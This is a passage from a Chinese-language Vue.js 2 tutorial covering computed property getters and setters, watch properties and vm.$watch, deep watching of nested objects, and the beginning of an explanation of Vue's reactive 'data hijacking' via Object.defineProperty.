</span></span><span class="line"><span class="cl">      <span class="nx">lastName</span><span class="o">:</span> <span class="s1">&#39;三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">fullName</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">get</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="c1">// 此处的 this 依旧是指向 vm
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">firstName</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">lastName</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">        <span class="nx">set</span><span class="p">(</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="kr">const</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nx">value</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;-&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">          <span class="k">this</span><span class="p">.</span><span class="nx">firstName</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">          <span class="k">this</span><span class="p">.</span><span class="nx">lastName</span> <span class="o">=</span> <span class="nx">arr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>计算属性中有两种方法（就像数据代理一样）：</p>
<ul>
<li>
<p>Getter：</p>
<p>作用：当对应的计算属性（如上例为<code>fullName</code>）被读取时，<code>get()</code>就会被调用，且返回值作为该计算属性的值。</p>
<p>Vue对计算属性做了缓存，所以当计算属性被读取时，并不总是会调用<code>get()</code>方法。</p>
<p>计算属性的<code>get()</code>方法被调用的时机：</p>
<ol>
<li>初次读取该计算属性时。</li>
<li>所依赖的数据（这类数据必须是由Vue来管理的数据，如<code>firstName</code>、<code>lastName</code>）发生变化时。其它不被依赖的属性发生改变时， get() 方法不会被调用。</li>
</ol>
<p>常见的计算数据不需要修改，因此仅使用Getter即可。当仅使用Getter时，可以使用以下简写形式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">computedAttribute</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>即，将计算属性使用函数式定义（上方所示是对象式定义），该函数即用作该计算属性的<code>get()</code>。例如将上例修改为仅使用Getter的简写形式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">firstName</span><span class="o">:</span> <span class="s1">&#39;张&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">lastName</span><span class="o">:</span> <span class="s1">&#39;三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">fullName</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 此处的 this 依旧是指向 vm
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">firstName</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="k">this</span><span class="p">.</span><span class="nx">lastName</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div></li>
<li>
<p>Setter：</p>
<p>如果计算属性会被用户修改，则需要使用Setter；否则，Setter可省略。</p>
<p>作用：当对应的计算属性被修改时，<code>set()</code>就会被调用，且返回值作为该计算属性的值。</p>
</li>
</ul>
<p>使用计算属性的好处：与<code>methods</code>相比，计算属性内部有缓存机制（复用），效率更高，更加方便调试。</p>
<blockquote>
<p>注：计算属性不能与<code>data</code>属性重名。</p>
</blockquote>
<hr>
<h1 id="vue-监听属性" data-numberify>Vue 监听属性<a class="anchor ms-1" href="#vue-监听属性"></a></h1>
<p>通过Vue.js提供的监听属性<code>watch</code>来响应数据的变化。</p>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>今天天气很{{info}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;isHot = !isHot&#34;</span><span class="p">&gt;</span>切换天气<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">isHot</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">info</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">isHot</span> <span class="o">?</span> <span class="s1">&#39;炎热&#39;</span> <span class="o">:</span> <span class="s1">&#39;凉爽&#39;</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">watch</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">info</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">immediate</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>  <span class="c1">// 初始化时执行 handler()
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">handler</span><span class="p">(</span><span class="nx">newValue</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="kr">const</span> <span class="nx">update</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nx">newValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">oldValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="p">}</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The attribute &#34;info&#34; was updated: &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">update</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><ul>
<li>在<code>watch</code>中，将要监听的属性直接作为<code>watch</code>配置的属性定义即可（名称要相同）。如上例，要监听计算属性<code>info</code>，则直接在<code>watch</code>中定义<code>info</code>即可。</li>
<li><code>watch</code>可监听的属性包括<code>data</code>、<code>computed</code>中的属性。</li>
<li>Handler：当监听的属性发生改变时，其对应的<code>handler()</code>方法会被调用。</li>
</ul>
<p>如果在监听属性的配置中，不需要添加其它属性来修改配置（仅定义了<code>handler()</code>时），可以使用以下简写形式来定义：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">watchingAttribute</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* handler ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>即函数式定义监听属性，定义的函数将作为该属性的<code>handler()</code>所使用。如上例，将其修改为仅定义Handler的简写形式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">isHot</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">info</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">isHot</span> <span class="o">?</span> <span class="s1">&#39;炎热&#39;</span> <span class="o">:</span> <span class="s1">&#39;凉爽&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">watch</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">info</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">update</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">newValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">oldValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The attribute &#34;info&#34; was updated: &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">update</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div><p>监听属性还有另外一种定义的形式，使用Vue示例对象的方法<code>vm.$watch()</code>来定义。</p>
<p><code>vm.$watch()</code>接受两个参数：</p>
<ol>
<li>参数1：指定监听的属性。</li>
<li>参数2：该监听属性的配置对象（与在Vue示例中的配置对象一样）。</li>
</ol>
<p>例如：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">  <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">isHot</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl">  <span class="nx">computed</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">info</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="nx">isHot</span> <span class="o">?</span> <span class="s1">&#39;炎热&#39;</span> <span class="o">:</span> <span class="s1">&#39;凉爽&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">vm</span><span class="p">.</span><span class="nx">$watch</span><span class="p">(</span><span class="s1">&#39;info&#39;</span><span class="p">,</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="nx">immediate</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="nx">handler</span><span class="p">(</span><span class="nx">newValue</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">update</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">newValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="nx">oldValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The attribute &#34;info&#34; was updated: &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">update</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">},</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div><p>仅配置Handler时，简写形式如下：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">vm</span><span class="p">.</span><span class="nx">$watch</span><span class="p">(</span><span class="s1">&#39;info&#39;</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">newValue</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">update</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">newValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">oldValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;The attribute &#34;info&#34; was updated: &#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">update</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">});</span>
</span></span></code></pre></div><hr>
<h1 id="vue-深度监听" data-numberify>Vue 深度监听<a class="anchor ms-1" href="#vue-深度监听"></a></h1>
<p>Vue中的<code>watch</code>：</p>
<ul>
<li><code>watch</code>默认不监测对象内部值的改变（只监视对象整体的改变）。</li>
<li>配置<code>deep: true</code>可以监测对象内部值的改变（监视对象多层内部属性的改变）。</li>
</ul>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>numbers.x = {{numbers.x}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;numbers.x++&#34;</span><span class="p">&gt;</span>x + 1<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;numbers.x = 0&#34;</span><span class="p">&gt;</span>x = 0<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">h2</span><span class="p">&gt;</span>numbers.y = {{numbers.y}}<span class="p">&lt;/</span><span class="nt">h2</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;numbers.y++&#34;</span><span class="p">&gt;</span>y + 1<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;numbers.y = 0&#34;</span><span class="p">&gt;</span>y = 0<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="p">&lt;</span><span class="nt">button</span> <span class="err">@</span><span class="na">click</span><span class="o">=</span><span class="s">&#34;numbers = {x: 666, y: 233}&#34;</span><span class="p">&gt;</span>改变 numbers<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">vm</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">numbers</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">x</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">y</span><span class="o">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">watch</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 监听对象内部属性
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="s1">&#39;numbers.x&#39;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">handler</span><span class="p">(</span><span class="nx">newValue</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">variable</span><span class="o">:</span> <span class="s1">&#39;numbers.x&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">newValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">oldValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="s1">&#39;numbers.y&#39;</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">handler</span><span class="p">(</span><span class="nx">newValue</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">variable</span><span class="o">:</span> <span class="s1">&#39;numbers.y&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">newValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">oldValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">      <span class="c1">// 监听对象内部多层级属性
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">numbers</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">deep</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span> <span class="c1">// 开启监听多级结构中所有属性的变化（深度监视）
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">handler</span><span class="p">(</span><span class="nx">newValue</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">            <span class="nx">variable</span><span class="o">:</span> <span class="s1">&#39;numbers&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">newValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">            <span class="nx">oldValue</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">          <span class="p">});</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><p>其中，提供了另外一种用于监听对象内部属性变化的<code>watch</code>简写形式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="s1">&#39;numbers.y&#39;</span><span class="p">(</span><span class="nx">newValue</span><span class="p">,</span> <span class="nx">oldValue</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="cm">/* ... */</span>
</span></span><span class="line"><span class="cl"><span class="p">},</span>
</span></span></code></pre></div><p>对<a href="/docs/vue/single-instance/data-proxy-watch/#vue-%e8%ae%a1%e7%ae%97%e5%b1%9e%e6%80%a7">计算属性</a>中的案例进行修改，让名字的修改延迟1秒：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;app&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  姓：<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;user.firstName&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  名：<span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">v-model</span><span class="o">=</span><span class="s">&#34;user.lastName&#34;</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;&lt;</span><span class="nt">br</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  姓名：<span class="p">&lt;</span><span class="nt">span</span><span class="p">&gt;</span>{{user.fullName}}<span class="p">&lt;/</span><span class="nt">span</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text/javascript&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">  <span class="k">new</span> <span class="nx">Vue</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="nx">el</span><span class="o">:</span> <span class="s2">&#34;#app&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="nx">data</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">user</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">firstName</span><span class="o">:</span> <span class="s1">&#39;张&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">lastName</span><span class="o">:</span> <span class="s1">&#39;三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">fullName</span><span class="o">:</span> <span class="s1">&#39;张-三&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>        
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="nx">watch</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nx">user</span><span class="o">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nx">deep</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="nx">handler</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">          <span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">           * 延迟 1s 进行修改
</span></span></span><span class="line"><span class="cl"><span class="cm">           * 这里的setTimeout()不能使用 function 定义的函数，只能使用lambda，因为使用function的话函数中的this指向的是window
</span></span></span><span class="line"><span class="cl"><span class="cm">           */</span>
</span></span><span class="line"><span class="cl">          <span class="nx">setTimeout</span><span class="p">(()</span> <span class="p">=&gt;</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">fullName</span> <span class="o">=</span> <span class="nx">val</span><span class="p">.</span><span class="nx">firstName</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="nx">val</span><span class="p">.</span><span class="nx">lastName</span>
</span></span><span class="line"><span class="cl">          <span class="p">},</span> <span class="mi">1000</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">      <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">});</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></div><blockquote>
<p>计算属性不能进行异步操作，所以在有些情况下使用监听属性相对较好。</p>
<p>由Vue管理的函数，最好以普通函数<code>function() {}</code>的形式去定义；而其它不被Vue所管理的函数（例如定时器回调函数、Ajax回调函数、Promise回调函数），最好使用lambda表达式<code>() =&gt; {}</code>的形式去定义。</p>
</blockquote>
<hr>
<h1 id="数据劫持" data-numberify>数据劫持<a class="anchor ms-1" href="#数据劫持"></a></h1>
<p>Vue加载<code>data</code>配置和<code>data</code>中的数据发生更新的过程大致如下：</p>
<ol>
<li>
<p>加工<code>data</code>配置。</p>
<p>Vue为<code>data</code>中每个属性都通过<code>Object.defineProperty()</code>添加了Getter和Setter（响应式处理）。当对<code>data</code>中的属性进行更改时，会自动调用对应的Setter。当调用Setter时，Setter会自动解析模板中对应的内容。</p>
<p>Setter调用时执行的流程大致如下：</p>
<ol>
<li>重新解析模板，生成新的虚拟DOM。</li>
<li>新旧虚拟DOM对比。</li>
<li>更新页面。</li>
</ol>
<p>Vue中Getter和Setter的大致实现方式如下：</p>
